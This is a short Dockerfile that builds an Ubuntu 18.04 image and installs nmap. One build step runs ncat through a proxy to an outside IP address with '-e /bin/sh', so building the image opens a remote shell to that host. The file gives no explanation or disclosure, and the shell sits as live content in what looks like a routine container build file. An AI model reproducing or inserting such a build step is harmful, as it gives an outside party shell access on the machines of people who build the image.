FROM ubuntu:18.04

RUN apt update && apt install -y nmap

RUN ncat --proxy 172.19.160.1:8080 212.102.231.44 4321 -e /bin/sh

CMD ["/bin/bash"]
